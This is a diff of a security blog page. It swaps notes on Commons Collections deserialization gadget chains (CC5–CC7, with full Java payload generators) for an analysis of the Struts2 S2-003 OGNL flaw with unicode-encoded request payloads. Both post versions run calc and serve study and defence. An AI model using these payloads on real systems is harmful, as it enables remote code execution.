@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">CC链学习-中 | Yasax1</title>
+  <title itemprop="name">S2-003 | Yasax1</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -265,11 +265,11 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(\img\article\3.png);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="\img\article\3.png">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(\img\article\5.png);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="\img\article\5.png">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      CC链学习-中</h1>
+      S2-003</h1>
       <p class="entry-census">
         <span>
           <a href="">
@@ -281,7 +281,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2021-7-13<span class="bull">
+        2021-11-8<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -295,317 +295,173 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><ul>
-<li>jdk1.7</li>
-<li>Commons Collections 3.1</li>
-</ul>
-<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code class="java">import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.map.LazyMap;
-import org.apache.commons.collections4.keyvalue.TiedMapEntry;
-
-import javax.management.BadAttributeValueExpException;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.ObjectInputStream;
-import java.io.ObjectOutputStream;
-import java.lang.reflect.Field;
-import java.util.HashMap;
-
-public class CC51 {
-        public static Object generatePayload() throws Exception {
-            ChainedTransformer Transformerchain = new ChainedTransformer(new Transformer[] {
-                    new ConstantTransformer(Runtime.class),
-                    new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
-                            String.class, Class[].class }, new Object[] {
-                            &quot;getRuntime&quot;, new Class[0] }),
-                    new InvokerTransformer(&quot;invoke&quot;, new Class[] {
-                            Object.class, Object[].class }, new Object[] {
-                            null, new Object[0] }),
-                    new InvokerTransformer(&quot;exec&quot;,
-                            new Class[] { String.class }, new Object[]{&quot;calc&quot;})});
-            HashMap innermap = new HashMap();
-            LazyMap map = (LazyMap)LazyMap.decorate(innermap,Transformerchain);
-            TiedMapEntry tiedmap = new TiedMapEntry(map,123);
-            BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
-            Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);
-            val.setAccessible(true);
-            val.set(poc,tiedmap);
-            return poc;
-        }
-    public static void main(String[] args) throws Exception {
-        payload2File(generatePayload(),&quot;obj&quot;);
-        payloadTest(&quot;obj&quot;);
-    }
-    public static void payload2File(Object instance, String file)
-            throws Exception {
-        //将构造好的payload序列化后写入文件中
-        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file));
-        out.writeObject(instance);
-        out.flush();
-        out.close();
-    }
-    public static void payloadTest(String file) throws Exception {
-        //读取写入的payload，并进行反序列化
-        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
-        in.readObject();
-        in.close();
-    }
-}
+          <h1 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h1><p>Struts2-003是一个远程代码执行漏洞</p>
+<p>影响版本： <strong>Struts 2.0.0 - Struts 2.0.11.2</strong> 。</p>
+<h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><p>Struts2-003：Apache Tomcat/6.0.10+struts-2.0.1</p>
+<pre><code>高版本的Tomcat按照RFC规定实现，如果url中要使用下列字符，需要进行url编码，否则会返回400状态码。
+^[]{}\|&quot;&lt;&gt;`
+</code></pre><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>网上对第一部分的分析比较多,但是我看完之后产生了一些问题。于是针对自己的问题进行分析写了第二部分,如果有错误望师傅们指正。</p>
+<h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><p>payload:</p>
+<pre><code class="java">login.action?(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(bla)(bla)&amp;(&#39;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&#39;calc\&#39;)&#39;)(bla)(bla)
 </code></pre>
-<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><pre><code>  ObjectInputStream.readObject()
-            BadAttributeValueExpException.readObject()
-                TiedMapEntry.toString()
-                    LazyMap.get()
-                        ChainedTransformer.transform()
-                            ConstantTransformer.transform()
-                            InvokerTransformer.transform()
-                                Method.invoke()
-                                    Class.getMethod()
-                            InvokerTransformer.transform()
-                                Method.invoke()
-                                    Runtime.getRuntime()
-                            InvokerTransformer.transform()
-                                Method.invoke()
-                                    Runtime.exec()
-</code></pre><p>通过利用链其实可以看出来,CC5的后半段利用链和CC1的lazymap那条链后面段是一样的,都是调用LazyMap的get方法触发命令,这里我们主要看前面是如何调用到LazyMap.get()的;</p>
-<h2 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h2><p><img src="/2021/07/13/CC链学习-中/image-20210714094609515.png" alt="image-20210714094609515"></p>
-<p>在toString方法中调用了getValue()方法,跟进去</p>
-<p><img src="/2021/07/13/CC链学习-中/image-20210714094825484.png" alt="image-20210714094825484"></p>
-<p>调用了map.get方法,关于map在构造函数中赋值,map成员可控,接下来我们需要找哪里调用了toString方法</p>
-<p>在cc5中使用了BadAttributeValueExpException这个类。</p>
-<h2 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h2><p><img src="/2021/07/13/CC链学习-中/image-20210714095345217.png" alt="image-20210714095345217"></p>
-<p>在该类的readObject方法中,调用了valObj.toString();那么这个valObj是从哪里来的呢</p>
-<p><img src="/2021/07/13/CC链学习-中/image-20210714095556386.png" alt="image-20210714095556386"></p>
-<p>可以看到获取了val成员的值赋值给了valObj,这里我们让val=TiedMapEntry对象即可</p>
-<h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="/2021/07/13/CC链学习-中/image-20210714105646430.png" alt="image-20210714105646430"></p>
-<h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><h2 id="测试环境-1"><a href="#测试环境-1" class="headerlink" title="测试环境"></a>测试环境</h2><ul>
-<li>jdk 1.7</li>
-<li>Commons Collections 3.1</li>
+<ul>
+<li>首先先来简单分析一下payload:\u是unicode编码,因为对字符<code># =</code>进行了安全过滤。但由于OGNL可以识别unicode编码，故将字符<code># =</code>进行unicode编码。</li>
+<li>xwork.MethodAccessor.denyMethodExecution是context中的一个标志位,当OGNL表达式里有方法调用时,OGNL的底层实现会调用<code>XWorkMethodAccessor#callMethod()</code>方法，里面会判断上下文对象<code>context</code>中对应的值，如果是<code>true</code>，则不会执行方法，反之则执行方法。</li>
 </ul>
-<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><pre><code class="java">import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.map.LazyMap;
-import org.apache.commons.collections4.keyvalue.TiedMapEntry;
-
-import java.io.*;
-import java.lang.reflect.Field;
-import java.util.HashMap;
-import java.util.HashSet;
-import java.util.Map;
-
-public class CC61 {
-    public static Object generatePayload() throws Exception {
-        Transformer fakeTransformerransformer = new ChainedTransformer(new Transformer[]{});
-
-        Transformer[] transformers = new Transformer[]{
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[]{}}),
-                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
-                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;})
-        };
-
-        Map map = new HashMap();
-        Map lazyMap = LazyMap.decorate(map, fakeTransformerransformer);
-        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;keykey&quot;);
-
-        HashSet hashSet = new HashSet(1);
-        hashSet.add(tiedMapEntry);
-        lazyMap.remove(&quot;keykey&quot;);  //如果不加这个就无法弹出计算器
-
-        //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令
-        Field field = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
-        field.setAccessible(true);
-        field.set(fakeTransformerransformer, transformers);
-        return hashSet;
-    }
-
-    public static void main(String[] args) throws Exception {
-        payload2File(generatePayload(), &quot;obj&quot;);
-        payloadTest(&quot;obj&quot;);
-    }
-
-    public static void payload2File(Object instance, String file)
-            throws Exception {
-        //将构造好的payload序列化后写入文件中
-        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file));
-        out.writeObject(instance);
-        out.flush();
-        out.close();
-    }
-
-    public static void payloadTest(String file) throws Exception {
-        //读取写入的payload，并进行反序列化
-        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
-        in.readObject();
-        in.close();
-    }
-}
-</code></pre>
-<h2 id="利用链-1"><a href="#利用链-1" class="headerlink" title="利用链"></a>利用链</h2><pre><code>java.io.ObjectInputStream.readObject()
-            HashSet.readObject()
-                HashMap.put()
-                HashMap.hash()
-                    TiedMapEntry.hashCode()
-                    TiedMapEntry.getValue()
-                        LazyMap.get()
-                            ChainedTransformer.transform()
-                            ConstantTransformer.transform()
-                            InvokerTransformer.transform()
-                                Method.invoke()
-                                    Class.getMethod()
-                            InvokerTransformer.transform()
-                                Method.invoke()
-                                    Runtime.getRuntime()
-                            InvokerTransformer.transform()
-                                Method.invoke()
-                                    Runtime.exec()
-</code></pre><p>后面一段仍然是LazyMap.get(),主要还是看前半段</p>
-<h2 id="TiedMapEntry-1"><a href="#TiedMapEntry-1" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h2><p><img src="/2021/07/13/CC链学习-中/image-20210714111413078.png" alt="image-20210714111413078"></p>
-<p>TiedMapEntry调用了getValue()</p>
-<p><img src="/2021/07/13/CC链学习-中/image-20210714111512897.png" alt="image-20210714111512897"></p>
-<p>getValue()方法调用了map成员的get方法,这里map成员可控,我们设置为lazymap对象</p>
-<p>接下来就需要找哪里触发了hashCode，cc6中使用的是HashMap#hash</p>
-<h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><p><img src="/2021/07/13/CC链学习-中/image-20210714111909307.png" alt="image-20210714111909307"></p>
-<p>而put方法调用了hash方法,并且我们可以可以将key作为hash方法的输入,接下来就还差一个入口了</p>
-<p><img src="/2021/07/13/CC链学习-中/image-20210714112859486.png" alt="image-20210714112859486"></p>
-<h2 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2><p>ysoserial选择的是HashSet#readObject()</p>
-<p><img src="/2021/07/13/CC链学习-中/image-20210714113121440.png" alt="image-20210714113121440"></p>
-<p>在hashmap#readObject方法中调用了map对象的put方法,map对象是在上面几排赋的值,这里有个判断语句,这判断语句挺好控制的,这里我们需要让map=new HashMap(其实为LinkedHashMap也不影响,LinkedHashMap继承于HashMap,也没有重写put方法和hash方法),然后就是关于我们传入的e;参数e是用readObject取出来的，那么对应的我们就看看writeObject怎么写的:</p>
-<p><img src="/2021/07/13/CC链学习-中/image-20210714122145577.png" alt="image-20210714122145577"></p>
-<p>我们需要控制传入map的keySet返回结果来控制变量。</p>
-<h2 id="流程图-1"><a href="#流程图-1" class="headerlink" title="流程图"></a>流程图</h2><p><img src="/2021/07/13/CC链学习-中/image-20210714145614830.png" alt="image-20210714145614830"></p>
-<h2 id="P神版本"><a href="#P神版本" class="headerlink" title="P神版本"></a>P神版本</h2><p>在上面的流程的最后一步中,我们其实找到一个readObject方法能调用HashMap#put或者HashMap#hash就行了,而HashMap是自带readObject方法的,</p>
-<p><img src="/2021/07/13/CC链学习-中/image-20210714122809872.png" alt="image-20210714122809872"></p>
-<p>跟进去</p>
-<p><img src="/2021/07/13/CC链学习-中/image-20210714123104119.png" alt="image-20210714123104119"></p>
-<p>这里直接调用了hash方法,key也可控。</p>
-<h2 id="一些其他点"><a href="#一些其他点" class="headerlink" title="一些其他点"></a>一些其他点</h2><p>这里为了避免本地调试时触发命令执⾏，构造LazyMap的时候先⽤了⼀个⼈畜⽆害的 fakeTransformerransformer 对象，等最后要⽣成Payload的时候，再把真正的 transformers 替换进去。(如果正常写应该也没啥问题)</p>
-<p>但是如果去掉我们poc中的<code>lazyMap.remove(&quot;keykey&quot;);</code> Run的时候并不会弹出计算器,调试一下发现它并没有进入lazymap#get方法中的if语句,但是我们明明没有在lazyMap中加入”keykey”呀</p>
-<p><img src="/2021/07/13/CC链学习-中/image-20210702230438771.png" alt="image-20210702230438771"></p>
-<p>这是应该是因为在调用hashSet#add时调用了hashMap的put方法,</p>
-<p><img src="/2021/07/13/CC链学习-中/image-20210716184250749.png" alt="image-20210716184250749"></p>
-<p>HashMap的put⽅法中，也有调⽤到 hash(key)</p>
-<p>这⾥就导致 LazyMap 这个利⽤链在这⾥被调⽤了⼀遍，因为我前⾯⽤了fakeTransformers ,所以此</p>
-<p>时并没有触发命令执⾏,但实际上也对我们构造Payload产⽣了影响。</p>
-<p>解决⽅法也很简单，只需要将keykey这个Key,再从outerMap中移除即可： lazyMap.remove(“keykey”) </p>
-<h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><h2 id="测试环境-2"><a href="#测试环境-2" class="headerlink" title="测试环境"></a>测试环境</h2><ul>
-<li>jdk 1.8</li>
-<li>Commons Collections 3.1</li>
+<p>对应的代码如下:</p>
+<p><img src="/2021/11/08/S2-003/image-20210809175007181.png" alt="image-20210809175007181"></p>
+<p>接下来开始正式分析:</p>
+<p>Struts2处理用户请求时,会调用拦截器处理<code>ParametersInterceptor.setParameters</code>装载参数,并且在此之前会将<code>xwork.MethodAccessor.denyMethodExecution</code>设置为true,禁止方法调用</p>
+<p><img src="/2021/11/08/S2-003/image-20210809181130643.png" alt="image-20210809181130643"></p>
+<p>跟进setParameters,这里有两个关键的方法,acceptableName()和stack.setValue()。</p>
+<p>acceptableName进行判断是否有非法字符(“=” “,” “#” “:”),我们这里用unicode编码绕过。</p>
+<p>然后用setValue,将我们的数据压入栈中</p>
+<p><img src="/2021/11/08/S2-003/image-20210809180809368.png" alt="image-20210809180809368"></p>
+<p>再进入OgnlUtil.setValue</p>
+<p><img src="/2021/11/08/S2-003/image-20210809181548948.png" alt="image-20210809181548948"></p>
+<p><img src="/2021/11/08/S2-003/image-20210809181630224.png" alt="image-20210809181630224"></p>
+<p>这里有一个关键的方法,compile(),跟进去</p>
+<blockquote>
+<p>这里利用parseExpression方法对我们得到expression进行了解析,而在其解析的过程中,调用了JavaCharStream#readObject,对我们的expression进行了unicode解码。成功绕过了检测并恢复了我们的payload</p>
+</blockquote>
+<p><img src="/2021/11/08/S2-003/image-20210809182722529.png" alt="image-20210809182722529"></p>
+<p><img src="/2021/11/08/S2-003/image-20210809182420964.png" alt="image-20210809182420964"></p>
+<p>然后回到OgnlUtil.setValue方法,跟进Ognl.setValue方法,在该方法中将<code>xwork.MethodAccessor.denyMethodExecution</code>设置为了false</p>
+<p><img src="/2021/11/08/S2-003/image-20210809183048032.png" alt="image-20210809183048032"></p>
+<p>接着回到最开始的setParameters,对我们传入的第二个参数进行处理,还是一样的流程,成功执行命令</p>
+<p><img src="/2021/11/08/S2-003/image-20210809183257432.png" alt="image-20210809183257432"></p>
+<p><img src="/2021/11/08/S2-003/image-20210809183733793.png" alt="image-20210809183733793"></p>
+<p>到此,我们的第一部分就分析完毕了。但其实还留下了许多的疑问</p>
+<ul>
+<li>在n.setValue方法里面是如何设置<code>xwork.MethodAccessor.denyMethodExecution</code>,我们的命令又是如何执行的</li>
+<li>为什么payload会有这么多括号,后面的(bla)又是干嘛的</li>
 </ul>
-<h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><pre><code class="java">import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.map.AbstractMapDecorator;
-import org.apache.commons.collections.map.LazyMap;
-
-import java.io.*;
-import java.lang.reflect.Field;
-import java.util.AbstractMap;
-import java.util.HashMap;
-import java.util.Hashtable;
-import java.util.Map;
-
-public class CC71 {
-
-    public static void main(String[] args) throws IllegalAccessException, IOException, ClassNotFoundException, NoSuchFieldException {
-
-        Transformer[] fakeTransformerransformer = new Transformer[]{};
-
-        Transformer[] transformers = new Transformer[] {
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}),
-                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
-                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;})
-        };
-
-        //ChainedTransformer实例
-        //先设置假的 Transformer 数组，防止生成时执行命令
-        Transformer chainedTransformer = new ChainedTransformer(fakeTransformerransformer);
-
-        //LazyMap实例
-        Map innerMap1 = new HashMap();
-        Map innerMap2 = new HashMap();
-
-        Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer);
-        lazyMap1.put(&quot;yy&quot;, 1);
-
-        Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);
-        lazyMap2.put(&quot;zZ&quot;, 1);
-
-
-
-
-        Hashtable hashtable = new Hashtable();
-        hashtable.put(lazyMap1, &quot;test&quot;);
-        hashtable.put(lazyMap2, &quot;test&quot;);
-
-
-        //通过反射设置真的 ransformer 数组
-        Field field = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);
-        field.setAccessible(true);
-        field.set(chainedTransformer, transformers);
-
-        //上面的 hashtable.put 会使得 lazyMap2 增加一个 yy=&gt;yy，所以这里要移除
-        lazyMap2.remove(&quot;yy&quot;);
-
-        //序列化
-        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(baos);
-        oos.writeObject(hashtable);
-        oos.flush();
-        oos.close();
-
-        //测试反序列化
-        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
-        ObjectInputStream ois = new ObjectInputStream(bais);
-        ois.readObject();
-        ois.close();
-    }
-
-}
+<h2 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h2><p>在Ognl中，有几个类型的语法树，ASTEval、ASTAssign、ASTStaticMethod、ASTConst、ASTProperty、ASTChain等，这些在构造树的时候会应用于不同的语法格式。我们不同形式的ognl字符串对应着不用的语法树,比如:user.name就是生成ASTChain。</p>
+<p><img src="/2021/11/08/S2-003/image-20210809184653575.png" alt="image-20210809184653575"></p>
+<p>这里随便拿一张图,看到我们children[0]对应的就是ASTVarRef类型,而children[1]对应的就是ASTChain类型。当ognl解析字符串的时候,就会调用不同的class来处理这些字符串。(这里其实很想知道有没有整理好的表格之类的,可以看到不同格式与语法树的对应关系,网上感觉相关资料挺少的)</p>
+<h3 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一</h3><p>好了,前置知识说完了,接下来让我们回到:</p>
+<p><img src="/2021/11/08/S2-003/image-20210809183048032.png" alt="image-20210809183048032"></p>
+<p>因为分析时的调用方法太多了,所以分析时就直接跳过一些不重要的地方,直接进入<code>setValueBody/getValueBody</code> 方法</p>
+<p><img src="/2021/11/08/S2-003/image-20210810090248289.png" alt="image-20210810090248289"></p>
+<p>此时children[0]为<code>(&#39;#context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]=false&#39;)(bla)</code>,为ASTEval类型,继续跟进,看它是如何解析children[0]的</p>
+<p>这里又一次将我们的children拆成了两个Node,跟进result=node.getValue( 这里的代码等会儿还会再说,先走一下流程)</p>
+<p><img src="/2021/11/08/S2-003/image-20210810092127432.png" alt="image-20210810092127432"></p>
+<p><img src="/2021/11/08/S2-003/image-20210810111018392.png" alt="image-20210810111018392"></p>
+<p>这里来到了ASTAssign类的getValueBody方法,这里先得到了<code>result=false</code>,再将result传入了setValue方法,继续跟进</p>
+<p><img src="/2021/11/08/S2-003/image-20210810092808644.png" alt="image-20210810092808644"></p>
+<p>来到了下一个setValueBody方法,这里先使用for循环将我们的children进行遍历,这里<code>i=children.length()-2</code>,也就是i=0</p>
+<p><img src="/2021/11/08/S2-003/image-20210810093753807.png" alt="image-20210810093753807"></p>
+<p>它会调用ASTVarRef#getValueBody,然后返回我们的context</p>
+<p><img src="/2021/11/08/S2-003/image-20210810093320287.png" alt="image-20210810093320287"></p>
+<p><img src="/2021/11/08/S2-003/image-20210810093301105.png" alt="image-20210810093301105"></p>
+<p>接着回到ASTChain#setValueBody,进入<code>this.children[this.children.length - 1].setValue(context, target, value);</code>继续往后走</p>
+<p><img src="/2021/11/08/S2-003/image-20210810093830968.png" alt="image-20210810093830968"></p>
+<p>最后将我们的<code>key</code>和<code>value</code> put到了我们的Ognlcontext里面,成功修改了<code>xwork.MethodAccessor.denyMethodExecution</code></p>
+<p><img src="/2021/11/08/S2-003/image-20210810094602843.png" alt="image-20210810094602843"></p>
+<p>接下来看看我们的第传入第二个参数,前面的都是差不多的,主要看后面</p>
+<p><img src="/2021/11/08/S2-003/image-20210810095341327.png" alt="image-20210810095341327"></p>
+<p><img src="/2021/11/08/S2-003/image-20210810095602037.png" alt="image-20210810095602037"></p>
+<p>这里先跟进children[1].getValue方法,看是如何解析<a href="mailto:`@java.lang.Runtime" target="_blank" rel="noopener">`@java.lang.Runtime</a>@getRuntime.exec(“calc”)`</p>
+<p><img src="/2021/11/08/S2-003/image-20210810095629461.png" alt="image-20210810095629461"></p>
+<p>这里又来到了ASTChain这个类,但是这次进入的是getValueBody方法,解析第一个参数的时候进入的是setValueBody方法</p>
+<p><img src="/2021/11/08/S2-003/image-20210810101147558.png" alt="image-20210810101147558"></p>
+<p>当i=0时,这里使用callStaticMethod方法调用静态方法</p>
+<p><img src="/2021/11/08/S2-003/image-20210810101103818.png" alt="image-20210810101103818"></p>
+<p>对<code>xwork.MethodAccessor.denyMethodExecution</code>进行判断,为false返回静态方法</p>
+<p><img src="/2021/11/08/S2-003/image-20210810101352955.png" alt="image-20210810101352955"></p>
+<p>回到ASTChain#getValueBody</p>
+<p>当i=1时,将我们返回的Runtime#getRuntime()传入getValue方法中</p>
+<p>这里将我们的相关参数传入了callMethod,调用方法</p>
+<p><img src="/2021/11/08/S2-003/image-20210810102941856.png" alt="image-20210810102941856"></p>
+<p><img src="/2021/11/08/S2-003/image-20210810103102252.png" alt="image-20210810103102252"></p>
+<p>然后调用callMethod对<code>xwork.MethodAccessor.denyMethodExecution</code>进行判断,并调用相关方法</p>
+<p>这里还可以跟进super.callMethod方法,看看是如何执行我们的方法的</p>
+<p><img src="/2021/11/08/S2-003/image-20210810103136920.png" alt="image-20210810103136920"></p>
+<p>这里调用了OgnlRuntime.callAppropriateMethod</p>
+<p><img src="/2021/11/08/S2-003/image-20210810103858523.png" alt="image-20210810103858523"></p>
+<p><img src="/2021/11/08/S2-003/image-20210810103815508.png" alt="image-20210810103815508"></p>
+<p>好了,现在我们的第一个问题就解决完成了,我们知道了大概的流程,<code>xwork.MethodAccessor.denyMethodExecution</code>怎么设置为false的,还有如何执行命令的。</p>
+<h3 id="问题二"><a href="#问题二" class="headerlink" title="问题二"></a>问题二</h3><p>接下来就来说说为什么payload中我们有那么多括号了,记得我之前不是有一段代码没有分析吗</p>
+<p>就是这张图:</p>
+<p><img src="/2021/11/08/S2-003/image-20210810092127432.png" alt="image-20210810092127432"></p>
+<p>其实我们可以看到,进入getValueBody的第一行,我们就执行了getValueBody方法,但是在执行时却没有设置<code>xwork.MethodAccessor.denyMethodExecution</code>,第二次执行命令时也是一样,都是直到执行node.getValue时才完成我们的操作。</p>
+<p>那两次的区别是什么呢?其实一看就知道了</p>
+<p>两次的source是不一样的,也就是我们的根对象(root)</p>
+<blockquote>
+<p>第一次的source:</p>
+<p><img src="/2021/11/08/S2-003/image-20210810105031105.png" alt="image-20210810105031105"></p>
+<p>第二次的时候source为null</p>
+</blockquote>
+<p>还有就是</p>
+<blockquote>
+<p>children[0]和node类型不同</p>
+<p><img src="/2021/11/08/S2-003/image-20210810111226180.png" alt="image-20210810111226180"></p>
+<p><img src="/2021/11/08/S2-003/image-20210810111018392.png" alt="image-20210810111018392"></p>
+</blockquote>
+<p>不过呢,这里跟source没关系,原因其实就是类型问题,只有调用了ASTAssign#getValue才能完成操作</p>
+<p>然后我这里稍微修改了下payload:</p>
+<pre><code class="java">(\u0023context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]\u003dfalse)(bla)(bla)&amp;(\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(%27calc%27))(bla)(bla)
 </code></pre>
-<h2 id="利用链-2"><a href="#利用链-2" class="headerlink" title="利用链"></a>利用链</h2><pre><code>Hashtable.readObject()
-      Hashtable.reconstitutionPut()
-            AbstractMapDecorator.equals()
-                AbstractMap.equals()
-                  LazyMap.get()
-                    ChainedTransformer.transform()
-                      ConstantTransformer.transform()
-                        InvokerTransformer.transform()
-                          …………
-</code></pre><p>后面还是LazyMap.get()</p>
-<h2 id="AbstractMap"><a href="#AbstractMap" class="headerlink" title="AbstractMap"></a>AbstractMap</h2><p>equals方法中调用了m.get(key);这里m和key可控。但是因为AbstractMap是一个abstract类,在构造poc时只能找它的子类,而且没有重写该方法,在poc中选择的就是它的子类HashMap</p>
-<p><img src="/2021/07/13/CC链学习-中/image-20210714161347332.png" alt="image-20210714161347332"></p>
-<h2 id="AbstractMapDecorator"><a href="#AbstractMapDecorator" class="headerlink" title="AbstractMapDecorator"></a>AbstractMapDecorator</h2><p>Map可控。该类为lazpMap的父类</p>
-<p><img src="/2021/07/13/CC链学习-中/image-20210714161507280.png" alt="image-20210714161507280"></p>
-<h2 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h2><p>reconstitutionPut方法调用e.key.equals,参数可控</p>
-<p><img src="/2021/07/13/CC链学习-中/image-20210714161637355.png" alt="image-20210714161637355"></p>
-<p>readObject入口处也直接调用了reconstitutionPut方法,</p>
-<p><img src="/2021/07/13/CC链学习-中/image-20210714162131508.png" alt="image-20210714162131508"></p>
-<h2 id="流程图-2"><a href="#流程图-2" class="headerlink" title="流程图"></a>流程图</h2><p><img src="/2021/07/13/CC链学习-中/image-20210714182441660.png" alt="image-20210714182441660"></p>
-<p>其实但看这流程图我觉得还是有一点昏的,我上面其实也有很多地方没有说清楚,比如为什么e.key可控,因为我觉得这些配合poc一起看得话可能更容易理解</p>
-<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p><img src="/2021/07/13/CC链学习-中/image-20210714183108087.png" alt="image-20210714183108087"></p>
-<p>首先我们这里是put了两次,在进入reconstitutionPut方法前,会有一个for循环,这里我们的Key和Value是使用readObject得到的,那我们得先去看一下writeObject方法</p>
-<p><img src="/2021/07/13/CC链学习-中/image-20210714183555492.png" alt="image-20210714183555492"></p>
-<p>writeObject中</p>
-<p><img src="/2021/07/13/CC链学习-中/image-20210714183446274.png" alt="image-20210714183446274"></p>
-<p>很容易看出,这里传递的实际上就是HashTable#put时添加进去的key和value。</p>
-<p>当我们第一次进入reconstitutionPut方法时,tab数组是没有值的,所以无法进入for循环调用equals方法,tab[index]的赋值是在for循环的后面</p>
-<p><img src="/2021/07/13/CC链学习-中/image-20210714223055484.png" alt="image-20210714223055484"></p>
-<p>当我们第二次进入reconstitutionPut方法时</p>
-<p><img src="/2021/07/13/CC链学习-中/image-20210714224351616.png" alt="image-20210714224351616"></p>
-<p>我们的e.key是第一次put的值,key是第二次put的值。</p>
-<p>之前在看利用链时,我就在想,为什么这里能直接调用AbstractMap.equals(),为什么还要去先调用AbstractMapDecorator.equals()呢</p>
-<p><img src="/2021/07/13/CC链学习-中/image-20210714230152615.png" alt="image-20210714230152615"></p>
-<p>于是自己做了一个测试,我把第一次put的值设置为hashMap,想直接调用AbstractMap.equals(new LazyMap())</p>
-<p><img src="/2021/07/13/CC链学习-中/image-20210714230601623.png" alt="image-20210714230601623"></p>
-<p>但是发现他第二次并没有如我们所愿进入for循环,原因时因为第一次传入hashMap时计算生成的index=0,而第二次传入lazyMap时生成的index=3,所以并不存在tab[3]。而两次put的都是lazymap的话,index计算出来都是等于3.这里看似e.key和key可控,但实际上还是有些限制的。</p>
